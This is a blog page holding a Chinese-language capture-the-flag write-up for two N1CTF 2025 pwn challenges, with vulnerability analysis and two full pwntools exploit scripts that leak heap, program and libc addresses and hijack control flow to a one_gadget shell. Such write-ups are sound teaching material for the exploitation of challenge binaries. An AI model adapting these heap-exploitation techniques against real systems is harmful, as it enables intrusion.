@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>n1ctf2025_pwn | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;    创建0x180的chunk存放note 结构体每个note大小为0x30，n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1ctf2025_pwn">
+<meta property="og:url" content="http://example.com/2025/09/16/n1ctf-pwn/index.html">
+<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
+<meta property="og:description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;    创建0x180的chunk存放note 结构体每个note大小为0x30，n">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
+<meta property="og:image" content="http://example.com/290fdb0b196e4d8a891ba30cab77f70e.png">
+<meta property="og:image" content="http://example.com/9b07c2893b9a413eab54aa77cdc96058.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png">
+<meta property="og:image" content="http://example.com/efc5f43229f54d76933b5a234281a226.png">
+<meta property="og:image" content="http://example.com/f46bbfaa51ec4ba798082ec1cc2ff78b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/3223b369f2604c2c9376f1811e20c019.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/925bdfb6e35546b18e779289175c57c3.png">
+<meta property="og:image" content="http://example.com/8a19c192b90d42a38510052ff390ade9.png">
+<meta property="article:published_time" content="2025-09-16T12:33:09.000Z">
+<meta property="article:modified_time" content="2025-11-17T12:36:48.558Z">
+<meta property="article:author" content="xrivendell7">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
+  
+    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-n1ctf-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/09/16/n1ctf-pwn/" class="article-date">
+  <time class="dt-published" datetime="2025-09-16T12:33:09.000Z" itemprop="datePublished">2025-09-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      n1ctf2025_pwn
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h1><p>保护全开</p>
+<h2 id="程序逻辑："><a href="#程序逻辑：" class="headerlink" title="程序逻辑："></a>程序逻辑：</h2><ol>
+<li>读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="number">0x111111111111111</span></span><br><span class="line">validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/4893f3cf5d0d480a8e32d9a11b2bbc82.png"></p>
+<ol start="2">
+<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：<br><img src="/290fdb0b196e4d8a891ba30cab77f70e.png"></p>
+</li>
+<li><p>add，edit，delete，show操作</p>
+</li>
+</ol>
+<h2 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h2><ol>
+<li><p>editName中strlen可以用\x00绕过造成溢出</p>
+</li>
+<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，<br><img src="/9b07c2893b9a413eab54aa77cdc96058.png" alt="在这里插入图片描述"><br>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
+</li>
+<li><p>这里的xor操作，其中的一个操作数是可控的，dest<br><img src="/efc5f43229f54d76933b5a234281a226.png"></p>
+</li>
+</ol>
+<p><img src="/f46bbfaa51ec4ba798082ec1cc2ff78b.png"></p>
+<h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>editName操作和show操作只能执行一次<br>利用xor操作构造任意地址读写条件泄露libc地址</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一阶段：<br>泄露heap基址和程序基址（PIE）<br>由于存在xor后的数据chunk的地址，结合动态调试，heap地址的后三字节是固定的，加上一字节的\x00溢出，<br>第一个note content chunk的起始地址为000+0x290（tcache bin管理结构）+0x190(note 结构体 chunk)&#x3D;0x420<br>如果控制xor的操作数后两位为20，且第二个note content chunk与第一个同处于0x400-0x4ff空间上，当使用editName方法溢出第二个结构体chunk的name，此时这两个结构体chunk的note content chunk就指向了同一个，此时就构造了一个UAF，可以泄露heap地址和程序地址（程序地址用BSS的chunkList的地址）<br>此时edit和show都用过一次不能再用了，很自然的就想到再执行一次main函数，将luckynumber设置为main addr<br>第二阶段：<br>上面只是思考过程，此时才发现：<br>在回顾一下heap的构造，结构体chunk有一部分也处0x400-0x4ff，再溢出一次name则xor结果末两位是00，此时xor第一个操作数末两位是什么（假如设置为0xmn），那么这个溢出的结构体的conten就会指向0x4mn，第一阶段的泄露操作也可以通过最后一个结构体chunk泄露</p>
+<p>这时就可以show和修改最后一个struct chunk的data  content chunk的地址（要写入xor后的结果），将其指向got表结合show操作就可以泄露libc、heap、程序地址<br>最后将LUCKYNUMBER设置为onegadget即可</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    xor = <span class="number">0x111111111111111</span></span><br><span class="line">    validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    key_default = <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    remove(key_default,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit_name(key_default,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>))</span><br><span class="line">    show(key_default,<span class="number">7</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    heap_base = ((uu64(r(<span class="number">7</span>))&lt;&lt;<span class="number">8</span>)^xor)&gt;&gt;<span class="number">12</span>&lt;&lt;<span class="number">12</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    proc_base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0x4080</span> - <span class="number">0x7</span>*<span class="number">8</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    main_sym = <span class="number">0x1CC7</span></span><br><span class="line">    ret_addr_in_remove = proc_base+main_sym</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(ret_addr_in_remove))</span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    one_gadget = one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    edit_name(key_default,<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>)+p64((proc_base+elf.got[<span class="string">&#x27;free&#x27;</span>])^xor))</span><br><span class="line">    show(key_default,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    free_addr = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    libc.address = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(libc.address+one_gadget))</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><p>叽里咕噜的说什么呢，看不懂<br><img src="https://i-blog.csdnimg.cn/direct/3223b369f2604c2c9376f1811e20c019.png" alt="[图片]"></p>
+<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6  ./libc.so.6 pwn</span><br><span class="line">LD_LIBRARY_PATH=./libc pwn</span><br></pre></td></tr></table></figure>
+
+<p>python中pwnlib调用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也需要先像上面的shell命令一样先patchelf</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># 二选一即可</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = gdb.debug(binary, gdbscript,env=&#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>:<span class="string">&#x27;./libc/&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;1. Exit\n&#x27;</span><br><span class="line">b&#x27;2. Add deque to vector\n&#x27;</span><br><span class="line">b&#x27;3. Create Animal in deque\n&#x27;</span><br><span class="line">b&#x27;4. Remove deque from vector\n&#x27;</span><br><span class="line">b&#x27;5. Remove Animal from deque\n&#x27;</span><br><span class="line">b&#x27;6. Edit Animal in deque\n&#x27;</span><br><span class="line">b&#x27;7. Print Animal in deque\n&#x27;</span><br><span class="line">b&#x27;12. Create Animal in vector\n&#x27;</span><br><span class="line">b&#x27;13. Remove Animal from vector\n&#x27;</span><br><span class="line">b&#x27;14. Edit Animal in vector\n&#x27;</span><br><span class="line">b&#x27;15. Print Animal in vector\n&#x27;</span><br><span class="line">b&#x27;Enter your choice: &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>IDA的结果看起来太复杂了，先直接进行几次操作看看<br><img src="https://i-blog.csdnimg.cn/direct/925bdfb6e35546b18e779289175c57c3.png" alt="[图片]"></p>
+<p>先尝试下有没有UAF<br>结果一试还真有</p>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
+<li>刚刚提到的UAF，可以通过unsorted bin fd泄露libc和tcache bin fd泄露heap基址</li>
+<li>堆溢出<br><img src="/8a19c192b90d42a38510052ff390ade9.png"><br>很明显看到有个堆溢出</li>
+</ol>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先利用deque上的操作泄露地址<br>后用vector上的操作任意地址写（当时熬夜写的题，我也没去分析它到底能不能用deque的方法来，就是觉得给了这么多方法都用试试）<br>vecor申请的chunk结构是：一个0x20大小的结构体和对应size大小的animal，结构体中写着animal chunk的地址，因为能栈溢出，所以直接可以任意地址写<br>这里采取的操作时打enviorn打栈，从main的ret指令开始打；<br>算出environ到执行到main ret时栈地址的偏移量，然后构造栈满足ongadget的条件即可，也可以构造rop链<br>利用脚本<br>最后执行exit操作就可以执行到main的ret<br>注意执行execve的时候保证结尾是0x0而不是8吧，对齐一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    add_deque()</span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    show_animal_deque(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">&#x27;): &#x27;</span>)</span><br><span class="line">    libc.address = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))-<span class="number">0x203b20</span></span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment"># 防止deque为空而不能show UAF</span></span><br><span class="line">    create_animal_deque(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">    malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;    0xef52b execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x78])</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">    rax == NULL || &#123;&quot;/bin/sh&quot;, rax, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">    [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp&#x27;&#x27;&#x27;</span></span><br><span class="line">    one_gadget =libc.address + one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    environ =  libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)    </span><br><span class="line">    create_animal_vector(<span class="number">0x90</span>)</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    environ_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x30</span>))</span><br><span class="line">    show_animal_vector(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;): &#x27;</span>)</span><br><span class="line">    start_addr = uu64(ru(<span class="string">b&#x27;\n&#x27;</span>)) - <span class="number">37</span></span><br><span class="line">    proc_base = start_addr - elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ret_of_main = environ_addr - <span class="number">0x130</span></span><br><span class="line">    ret_addr = proc_base+<span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(ret_of_main+<span class="number">8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0x110</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    edit_animal_vector(<span class="number">0</span>,<span class="number">0x90</span>+<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(environ_addr-<span class="number">0xe8</span>))</span><br><span class="line">    edit_animal_vector(<span class="number">1</span>,<span class="number">0x8</span>,p64(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># exit 推出时会执行ret of main</span></span><br><span class="line">    sla(<span class="string">b&#x27;Enter your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/09/16/n1ctf-pwn/" data-id="cuidlH2teuA6txmHVyAcynOGJ" data-title="n1ctf2025_pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/10/10/junior/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          n1ctf junior 2/2 web
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/09/02/TFCCTF2025/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">TFCCTF2025 web</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/17/qwb2025-pwn/">qwb2025-pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/02/TFCCTF2025/">TFCCTF2025 web</a>
+          </li>
+        
+          <li>
+            <a href="/2025/08/10/justCTF2025/">justCTF2025 web</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 xrivendell7<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
